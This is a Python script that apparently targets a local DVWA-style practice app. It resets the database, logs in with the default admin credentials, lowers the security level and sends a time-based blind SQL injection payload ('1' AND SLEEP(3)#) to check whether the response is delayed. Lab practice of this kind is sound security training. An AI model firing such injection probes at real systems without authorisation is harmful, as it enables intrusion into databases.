import re
import time
import requests

s = requests.Session()
r_setup_page = s.get("http://localhost:4280/setup.php")
setup_token = re.search(r"value='([a-f0-9]+)'", r_setup_page.text).group(1)
r_setup = s.post("http://localhost:4280/setup.php", data={
    "create_db": "Create / Reset Database",
    "user_token": setup_token,
})
print("Setup response length:", len(r_setup.text))
for line in r_setup.text.splitlines():
    if any(k in line.lower() for k in ["database has been created", "backend database", "error", "failed", "setup"]):
        print("Setup line:", line.strip())

# Login
r_login_page = s.get("http://localhost:4280/login.php")
login_token = re.search(r"value='([a-f0-9]+)'", r_login_page.text).group(1)
r_login = s.post("http://localhost:4280/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": login_token,
})
print("Login status:", r_login.status_code, "url:", r_login.url, "cookies:", dict(s.cookies))

# Set security to low
r_sec_page = s.get("http://localhost:4280/security.php")
sec_token = re.search(r"value='([a-f0-9]+)'", r_sec_page.text).group(1)
r_sec = s.post("http://localhost:4280/security.php", data={
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": sec_token,
})
print("Security level page status:", r_sec.status_code, "cookies:", dict(s.cookies))

# Test Blind SQLi: vulnerabilities/sqli_blind/?id=1&Submit=Submit
t0 = time.time()
r_base = s.get("http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit")
dur_base = time.time() - t0
print(f"Baseline query: {r_base.status_code} in {dur_base:.2f}s, url: {r_base.url}")

t0 = time.time()
r_sleep = s.get("http://localhost:4280/vulnerabilities/sqli_blind/", params={"id": "1' AND SLEEP(3)#", "Submit": "Submit"})
dur_sleep = time.time() - t0
print(f"Sleep(3) query: {r_sleep.status_code} in {dur_sleep:.2f}s, url: {r_sleep.url}")
